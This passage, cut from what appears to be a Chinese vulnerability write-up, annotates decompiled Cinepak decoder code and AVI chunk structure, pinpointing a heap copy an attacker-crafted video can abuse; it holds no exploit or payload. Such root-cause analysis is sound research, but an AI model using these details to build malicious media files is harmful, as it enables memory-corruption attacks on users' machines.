idx1_Len_of_CVID_data &gt;= <span class="number">0x20</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    cinepak_codec_data11 = cinepak_codec_data1; <span class="comment">// cinepak_codec_data1指针</span></span><br><span class="line">    BYTE1(result) = cinepak_codec_data1[<span class="number">1</span>];     <span class="comment">// CVID数据长度的第3个字节</span></span><br><span class="line">    LOBYTE(result) = cinepak_codec_data1[<span class="number">2</span>];    <span class="comment">// CVID数据长度的第2个字节</span></span><br><span class="line">    Len_of_CVID_data = (<span class="keyword">unsigned</span> __int8)cinepak_codec_data1[<span class="number">3</span>] | (result &lt;&lt; <span class="number">8</span>);<span class="comment">// 以大端读取CVID数据长度</span></span><br><span class="line">    <span class="comment">// idx1_Len_of_CVID_data为从“idx1”索引块中读出的数据块的数据长度,Len_of_CVID_data为从对应的数据块中读出的数据长度,这里判断它们是否相同</span></span><br><span class="line">    <span class="comment">// Frame Header-&gt;Flags</span></span><br><span class="line">    <span class="comment">// 如果Len_of_CVID_data&gt;=0xA,0xA为Frame Header的大小,则返回0,且计算出减去Frame Header的大小后,剩余的数据的大小,否则返回一个负数</span></span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)idx1_Len_of_CVID_data &lt; Len_of_CVID_data</span><br><span class="line">      || (HIBYTE(idx1_Len_of_CVID_data) = *cinepak_codec_data1,</span><br><span class="line">          ULongSub(Len_of_CVID_data, <span class="number">0xA</span>u, &amp;remain_coded_data_size) &lt; <span class="number">0</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_33:</span><br><span class="line">      result = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      HIBYTE(Num_of_coded_strips) = cinepak_codec_data11[<span class="number">8</span>];<span class="comment">// Number of coded strips的高位字节</span></span><br><span class="line">      cinepak_codec_data2 = cinepak_codec_data11 + <span class="number">0xA</span>;<span class="comment">// cinepak_codec_data2指针</span></span><br><span class="line">      num = <span class="number">0</span>;                                  <span class="comment">// coded strip计数器</span></span><br><span class="line">      cinepak_codec_data21 = cinepak_codec_data2;<span class="comment">// cinepak_codec_data2指针</span></span><br><span class="line">      cinepak_codec_data22 = cinepak_codec_data2;<span class="comment">// cinepak_codec_data2指针</span></span><br><span class="line">      LOBYTE(Num_of_coded_strips) = *(cinepak_codec_data2 - <span class="number">1</span>);<span class="comment">// Number of coded strips的低位字节</span></span><br><span class="line">      Num_of_coded_strips1 = Num_of_coded_strips;<span class="comment">// 以大端读取Number of coded strips</span></span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)Num_of_coded_strips &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        Heap_Ptr_Offset = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">// 判断“00dc”数据块剩余未解码数据长度是否小于0x16</span></span><br><span class="line">          <span class="keyword">if</span> ( remain_coded_data_size &lt; <span class="number">0x16</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          HIBYTE(v15) = cinepak_codec_data2[<span class="number">1</span>]; <span class="comment">// Strip CVID ID的低位字节</span></span><br><span class="line">          LOBYTE(v15) = cinepak_codec_data2[<span class="number">2</span>]; <span class="comment">// Size of strip data的高位字节</span></span><br><span class="line">          Size_of_strip_data = (<span class="keyword">unsigned</span> __int8)cinepak_codec_data2[<span class="number">3</span>] | (v15 &lt;&lt; <span class="number">8</span>);<span class="comment">// 以大端读取Size of strip data</span></span><br><span class="line">          <span class="comment">// 判断“00dc”数据块剩余未解码数据长度是否小于Size_of_strip_data</span></span><br><span class="line">          <span class="keyword">if</span> ( remain_coded_data_size &lt; Size_of_strip_data )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="comment">// 判断Strip CVID ID的高位字节是否为0x10和0x11</span></span><br><span class="line">          <span class="keyword">if</span> ( *cinepak_codec_data2 == <span class="number">0x10</span> || *cinepak_codec_data2 == <span class="number">0x11</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="comment">// 如果Size_of_strip_data&gt;=0xC,0xC为Strip Header大小,则返回0,且计算出减去Strip Header的大小后,剩余的数据大小,否则返回一个负数</span></span><br><span class="line">            <span class="keyword">if</span> ( ULongSub(Size_of_strip_data, <span class="number">0xC</span>u, &amp;arg1) &lt; <span class="number">0</span> )</span><br><span class="line">              <span class="keyword">goto</span> LABEL_33;</span><br><span class="line">            HIBYTE(Strips_bottom_Y_position) = cinepak_codec_data2[<span class="number">8</span>];<span class="comment">// Strips bottom Y position的高位字节</span></span><br><span class="line">            HIBYTE(Strips_top_Y_position) = cinepak_codec_data2[<span class="number">4</span>];<span class="comment">// Strips top Y position的高位字节</span></span><br><span class="line">            LOBYTE(Strips_bottom_Y_position) = cinepak_codec_data2[<span class="number">9</span>];<span class="comment">// Strips bottom Y position的低位字节</span></span><br><span class="line">            LOBYTE(Strips_top_Y_position) = cinepak_codec_data2[<span class="number">5</span>];<span class="comment">// Strips top Y position的低位字节</span></span><br><span class="line">            Strip_Y_pixel = Strips_bottom_Y_position - Strips_top_Y_position;</span><br><span class="line">            LOWORD(Strip_Y_pixel) = *(_WORD *)(arg11 + <span class="number">46</span>) * Strip_Y_pixel;</span><br><span class="line">            cinepak_codec_data1 = (_BYTE *)Strip_Y_pixel;</span><br><span class="line">            <span class="comment">// 1、Heap_Ptr_Offset不为0</span></span><br><span class="line">            <span class="comment">// 2、Frame Header-&gt;Flags为0x00,不使用上一个条(Strips)中定义的codebooks</span></span><br><span class="line">            <span class="comment">// 3、Strip CVID ID的高位字节为0x11</span></span><br><span class="line">            <span class="comment">// 4、则进行数据复制</span></span><br><span class="line">            <span class="keyword">if</span> ( Heap_Ptr_Offset &amp;&amp; !HIBYTE(idx1_Len_of_CVID_data) &amp;&amp; *cinepak_codec_data2 == <span class="number">0x11</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">// 目的地址: 源地址+0x2000</span></span><br><span class="line">              <span class="comment">// 源地址: 0x6000大小的堆块,第1次:0x0,第2次:0x2000,第3次:0x4000(相对于堆块数据区域首地址的偏移)</span></span><br><span class="line">              <span class="comment">// 复制数据长度: 0x2000字节</span></span><br><span class="line">              qmemcpy(</span><br><span class="line">                (<span class="keyword">void</span> *)(*(_DWORD *)(arg11 + <span class="number">28</span>) + Heap_Ptr_Offset),</span><br><span class="line">                (<span class="keyword">const</span> <span class="keyword">void</span> *)(*(_DWORD *)(arg11 + <span class="number">28</span>) + Heap_Ptr_Offset - <span class="number">0x2000</span>),</span><br><span class="line">                <span class="number">0x2000</span>u);</span><br><span class="line">              cinepak_codec_data2 = cinepak_codec_data21;</span><br><span class="line">            &#125;</span><br><span class="line">            CVID_Chunk_ID_Ptr = (<span class="keyword">int</span>)(cinepak_codec_data22 + <span class="number">0xC</span>);</span><br><span class="line">            CVID_Chunk_ID_Ptr1 = cinepak_codec_data2 + <span class="number">0xC</span>;</span><br><span class="line">            *(_DWORD *)(arg11 + <span class="number">56</span>) = Heap_Ptr_Offset + *(_DWORD *)(arg11 + <span class="number">32</span>);</span><br><span class="line">            CVID_Chunk_ID_Ptr2 = (<span class="keyword">int</span>)(cinepak_codec_data2 + <span class="number">0xC</span>);</span><br><span class="line">            *(_DWORD *)(arg11 + <span class="number">60</span>) = a7;</span><br><span class="line">            <span class="comment">// 判断Size_of_strip_data减去Strip Header的大小后,剩余的数据大小是否大于等于4,也就是Chunk Data不为空</span></span><br><span class="line">            <span class="keyword">while</span> ( arg1 &gt;= <span class="number">4</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              HIBYTE(v21) = CVID_Chunk_ID_Ptr1[<span class="number">1</span>];<span class="comment">// CVID Chunk ID的低位字节</span></span><br><span class="line">              LOBYTE(v21) = CVID_Chunk_ID_Ptr1[<span class="number">2</span>];<span class="comment">// Size of chunk data的高位字节</span></span><br><span class="line">              Size_of_chunk_data = CVID_Chunk_ID_Ptr1[<span class="number">3</span>] | (v21 &lt;&lt; <span class="number">8</span>);<span class="comment">// Size of chunk data的低位字节,以大端读取Size of chunk data</span></span><br><span class="line">              Size_of_chunk_data1 = Size_of_chunk_data;</span><br><span class="line">              <span class="comment">// 判断Size_of_strip_data减去Strip Header的大小后,剩余的数据大小是否小于Size_of_chunk_data</span></span><br><span class="line">              <span class="keyword">if</span> ( arg1 &lt; Size_of_chunk_data )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">              <span class="keyword">switch</span> ( *CVID_Chunk_ID_Ptr1 )    <span class="comment">// CVID Chunk ID的高位字节</span></span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0x20</span>u:                     <span class="comment">// List of blocks in 12 bit V4 codebook</span></span><br><span class="line">                <span class="keyword">case</span> <span class="number">0x21</span>u:                     <span class="comment">// Selective list of blocks to update 12 bit V4 codebook</span></span><br><span class="line">                <span class="keyword">case</span> <span class="number">0x24</span>u:                     <span class="comment">// List of blocks in 8 bit V4 codebook</span></span><br><span class="line">                <span class="keyword">case</span> <span class="number">0x25</span>u:                     <span class="comment">// Selective list of blocks to update 8 bit V4 codebook</span></span><br><span class="line">                  (*(<span class="keyword">void</span> (__stdcall **)(<span class="keyword">int</span>, _DWORD, _DWORD, _DWORD))arg11)(</span><br><span class="line">                    CVID_Chunk_ID_Ptr,</span><br><span class="line">                    *(_DWORD *)(arg11 + <span class="number">56</span>),</span><br><span class="line">                    *(_DWORD *)(arg11 + <span class="number">52</span>),</span><br><span class="line">                    *(_DWORD *)(arg11 + <span class="number">48</span>));   <span class="comment">// ExpandCodeBook32()</span></span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0x22</span>u:                     <span class="comment">// List of blocks in 12 bit V1 codebook</span></span><br><span class="line">                <span class="keyword">case</span> <span class="number">0x23</span>u:                     <span class="comment">// Selective list of blocks to update 12 bit V1 codebook</span></span><br><span class="line">                <span class="keyword">case</span> <span class="number">0x26</span>u:                     <span class="comment">// List of blocks in 8 bit V1 codebook</span></span><br><span class="line">                <span class="keyword">case</span> <span class="number">0x27</span>u:                     <span class="comment">// Selective list of blocks to update 8 bit V1 codebook</span></span><br><span class="line">                  (*(<span class="keyword">void</span> (__stdcall **)(<span class="keyword">int</span>, <span class="keyword">int</span>, _DWORD, _DWORD))(arg11 + <span class="number">4</span>))(</span><br><span class="line">                    CVID_Chunk_ID_Ptr,</span><br><span class="line">                    *(_DWORD *)(arg11 + <span class="number">56</span>) + <span class="number">0x1000</span>,</span><br><span class="line">                    *(_DWORD *)(arg11 + <span class="number">52</span>),</span><br><span class="line">                    *(_DWORD *)(arg11 + <span class="number">48</span>));   <span class="comment">// ExpandCodeBook32()</span></span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0x30</span>u:                     <span class="comment">// Vectors used to encode a frame</span></span><br><span class="line">                  (*(<span class="keyword">void</span> (__stdcall **)(<span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>, _BYTE *))(arg11 + <span class="number">8</span>))(</span><br><span class="line">                    arg11,</span><br><span class="line">                    CVID_Chunk_ID_Ptr + <span class="number">4</span>,</span><br><span class="line">                    Size_of_chunk_data - <span class="number">4</span>,</span><br><span class="line">                    a4,</span><br><span class="line">                    a5,</span><br><span class="line">                    a6,</span><br><span class="line">                    cinepak_codec_data1);       <span class="comment">// DrawKey32()</span></span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0x31</span>u:                     <span class="comment">// Selective set of vectors used to encode a frame</span></span><br><span class="line">                  (*(<span class="keyword">void</span> (__stdcall **)(<span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>, _BYTE *))(arg11 + <span class="number">16</span>))(</span><br><span class="line">                    arg11,</span><br><span class="line">                    CVID_Chunk_ID_Ptr + <span class="number">4</span>,</span><br><span class="line">                    Size_of_chunk_data - <span class="number">4</span>,</span><br><span class="line">                    a4,</span><br><span class="line">                    a5,</span><br><span class="line">                    a6,</span><br><span class="line">                    cinepak_codec_data1);       <span class="comment">// DrawInter32()</span></span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0x32</span>u:                     <span class="comment">// List of blocks from only the V1 codebook</span></span><br><span class="line">                  (*(<span class="keyword">void</span> (__stdcall **)(<span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>, _BYTE *))(arg11 + <span class="number">12</span>))(</span><br><span class="line">                    arg11,</span><br><span class="line">                    CVID_Chunk_ID_Ptr + <span class="number">4</span>,</span><br><span class="line">                    Size_of_chunk_data - <span class="number">4</span>,</span><br><span class="line">                    a4,</span><br><span class="line">                    a5,</span><br><span class="line">                    a6,</span><br><span class="line">                    cinepak_codec_data1);       <span class="comment">// DrawSmooth32()</span></span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              CVID_Chunk_ID_Ptr1 = (<span class="keyword">unsigned</span> __int8 *)(Size_of_chunk_data1 + CVID_Chunk_ID_Ptr2);</span><br><span class="line">              v23 = <span class="number">1</span>;</span><br><span class="line">              CVID_Chunk_ID_Ptr += Size_of_chunk_data1;</span><br><span class="line">              CVID_Chunk_ID_Ptr2 += Size_of_chunk_data1;</span><br><span class="line">              <span class="keyword">if</span> ( Size_of_chunk_data1 &gt; <span class="number">1</span> )</span><br><span class="line">                v23 = Size_of_chunk_data1;</span><br><span class="line">              <span class="comment">// Size_of_strip_data减去Strip Header的大小后,剩余的数据大小再减去Size_of_chunk_data(1个Strip可以包含多个CVID Chunk)</span></span><br><span class="line">              arg1 -= v23;</span><br><span class="line">            &#125;</span><br><span class="line">            a6 += a7 * (<span class="keyword">signed</span> __int16)cinepak_codec_data1;</span><br><span class="line">            ++num;                              <span class="comment">// coded strip计数器</span></span><br><span class="line">            Heap_Ptr_Offset += <span class="number">0x2000</span>;          <span class="comment">// 堆数据区指针偏移+0x2000</span></span><br><span class="line">          &#125;</span><br><span class="line">          cinepak_codec_data22 += Size_of_strip_data;<span class="comment">// 指向下一个Strip Header</span></span><br><span class="line">          remain_coded_data_size -= Size_of_strip_data;<span class="comment">// “00dc”数据块剩余未解码数据长度</span></span><br><span class="line">          cinepak_codec_data2 += Size_of_strip_data;<span class="comment">// 指向下一个Strip Header</span></span><br><span class="line">          cinepak_codec_data21 = cinepak_codec_data2;<span class="comment">// 指向下一个Strip Header</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( num &lt; Num_of_coded_strips1 );</span><br><span class="line">      &#125;</span><br><span class="line">      result = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;一个正常的使用<code>Cinepak视频编解码器</code>对视频数据编码的<code>样本</code>，可以在<a href="https://wiki.multimedia.cx/index.php?title=Cinepak" target="_blank" rel="noopener">这里</a>找到。我分析时使用的是<code>样本</code><a href="http://samples.mplayerhq.hu/V-codecs/CVID/flicker/cvid-crash.avi" target="_blank" rel="noopener">cvid-crash.avi</a>。此样本的<code>实际视频数据块</code>，也就是<code>“movi”列表</code>，全部是由<code>“00dc”压缩视频帧数据块</code>和<code>“JUNK”块</code>构成。其中<code>“00dc”压缩视频帧数据块</code>中存放的数据就是经过<code>Cinepak视频编解码器</code>编码后的<code>视频帧数据</code>，每个<code>“00dc”压缩视频帧数据块</code>应该保存的是此视频<code>一帧的数据</code>。每个<code>“00dc”数据块</code>包含一个<code>“Frame Header”</code>和一个<code>“Strip”</code>。整个<code>“movi”列表</code>只包含一个<code>“Strip CVID ID”</code>为<code>0x1000</code>的<code>“00dc”数据块</code>，其余的<code>“00dc”数据块</code>中的<code>“Strip”</code>的<code>“Strip CVID ID”</code>都为<code>0x1100</code>。整个<code>“movi”列表</code>的结构如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">+------+--------+--------+</span><br><span class="line">|      |        | 0x2000 | &lt;--- List of blocks in 12 bit V4 codebook</span><br><span class="line">| 00dc | 0x1000 | 0x2200 | &lt;--- List of blocks in 12 bit V1 codebook</span><br><span class="line">|      |        | 0x3000 | &lt;--- Vectors used to encode a frame</span><br><span class="line">+------+--------+--------+</span><br><span class="line">|      |        | 0x2100 | &lt;--- Selective list of blocks to update 12 bit V4 codebook</span><br><span class="line">| 00dc | 0x1100 | 0x2300 | &lt;--- Selective list of blocks to update 12 bit V1 codebook</span><br><span class="line">|      |        | 0x3100 | &lt;--- Selective set of vectors used to encode a frame</span><br><span class="line">+------+--------+--------+</span><br><span class="line">|      |        | 0x2100 | &lt;--- Selective list of blocks to update 12 bit V4 codebook</span><br><span class="line">| 00dc | 0x1100 | 0x2300 | &lt;--- Selective list of blocks to update 12 bit V1 codebook</span><br><span class="line">|      |        | 0x3100 | &lt;--- Selective set of vectors used to encode a frame</span><br><span class="line">+------+--------+--------+</span><br><span class="line">| .... |  ....  |  ....  |</span><br><span class="line">+------+--------+--------+</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;<code>堆块数据区域</code>的<code>起始0x2000字节</code>的数据是从<code>“Strip CVID ID”</code>为<code>0x1000</code>的<code>Strip</code>中的<code>“CVID Chunk”</code>中的数据<code>解码后</code>得到的。这<code>0x2000字节</code>的数据的<code>前0x1000字节</code>数据是从<code>“CVID Chunk ID”</code>为<code>0x2000</code>的<code>“CVID Chunk”</code>中数据解码后得到的。<code>后0x1000字节</code>数据是从<code>“CVID Chunk ID”</code>为<code>0x2200</code>的<code>“CVID Chunk”</code>中数据解码后得到的。</p>
<p>&emsp;&emsp;这里的<code>“CVID Chunk ID”</code>为<code>0x2000</code>或<code>0x2200</code>的<code>“CVID Chunk”</code>还称为<code>CodeBooks</code>。<code>CodeBooks</code>中的内容是<code>CodeBooks向量</code>，在<code>12bpp模式</code>下，每个<code>CodeBooks向量</code>包含<code>4个8位亮度值</code>(luminance)和<code>2个子采样的8位色度值</code>(chrominance)，也就是<code>6字节</code>为一个<code>CodeBooks向量</code>。每个<code>CodeBooks</code>最多包含<code>256</code>个条目，所以一个<code>CodeBooks</code>最多包含256个<code>CodeBooks向量</code>。</p>
<p>&emsp;&emsp;当解码<code>“CVID Chunk ID”</code>为<code>0x2000</code>或<code>0x2200</code>的<code>CodeBooks</code>时，会调用<code>ExpandCodeBook32()</code>函数进行解码。<code>6字节</code>的<code>CodeBooks向量</code>会被解码为<code>16字节</code>数据。所以一个<code>CodeBooks</code>解码后的数据最大占用<code>256*16=4096=0x1000</code>字节。<code>ExpandCodeBook32()</code>函数经过逆向后的结果如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> __<span class="function">stdcall <span class="title">ExpandCodeBook32</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> CVID_Chunk_ID_Ptr, <span class="keyword">int</span> Heap_UserPtr, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int8 *CVID_Chunk_ID_Ptr1; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int16 v5; <span class="comment">// dx</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v7; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 *v8; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v9; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">char</span> *v10; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">signed</span> __int8 v11; <span class="comment">// al</span></span><br><span class="line">  __int16 v12; <span class="comment">// bx</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// ecx</span></span><br><span class="line">  __int16 v14; <span class="comment">// ax</span></span><br><span class="line">  <span class="keyword">char</span> v15; <span class="comment">// al</span></span><br><span class="line">  __int16 v16; <span class="comment">// cx</span></span><br><span class="line">  <span class="keyword">char</span> v17; <span class="comment">// al</span></span><br><span class="line">  __int16 v18; <span class="comment">// cx</span></span><br><span class="line">  <span class="keyword">char</span> v19; <span class="comment">// al</span></span><br><span class="line">  __int16 v20; <span class="comment">// cx</span></span><br><span class="line">  <span class="keyword">char</span> v21; <span class="comment">// al</span></span><br><span class="line">  __int16 v22; <span class="comment">// cx</span></span><br><span class="line">  <span class="keyword">char</span> v23; <span class="comment">// al</span></span><br><span class="line">  __int16 v24; <span class="comment">// cx</span></span><br><span class="line">  <span class="keyword">char</span> v25; <span class="comment">// al</span></span><br><span class="line">  __int16 v26; <span class="comment">// cx</span></span><br><span class="line">  <span class="keyword">char</span> v27; <span class="comment">// al</span></span><br><span class="line">  __int16 v28; <span class="comment">// cx</span></span><br><span class="line">  <span class="keyword">char</span> v29; <span class="comment">// al</span></span><br><span class="line">  __int16 v30; <span class="comment">// cx</span></span><br><span class="line">  <span class="keyword">char</span> *v31; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">signed</span> __int8 v32; <span class="comment">// al</span></span><br><span class="line">  __int16 v33; <span class="comment">// bx</span></span><br><span class="line">  <span class="keyword">int</span> v34; <span class="comment">// ecx</span></span><br><span class="line">  __int16 v35; <span class="comment">// ax</span></span><br><span class="line">  <span class="keyword">char</span> v36; <span class="comment">// al</span></span><br><span class="line">  __int16 v37; <span class="comment">// cx</span></span><br><span class="line">  <span class="keyword">char</span> v38; <span class="comment">// al</span></span><br><span class="line">  __int16 v39; <span class="comment">// cx</span></span><br><span class="line">  <span class="keyword">char</span> v40; <span class="comment">// al</span></span><br><span class="line">  __int16 v41; <span class="comment">// cx</span></span><br><span class="line">  <span class="keyword">char</span> v42; <span class="comment">// al</span></span><br><span class="line">  __int16 v43; <span class="comment">// cx</span></span><br><span class="line">  <span class="keyword">char</span> v44; <span class="comment">// al</span></span><br><span class="line">  __int16 v45; <span class="comment">// cx</span></span><br><span class="line">  <span 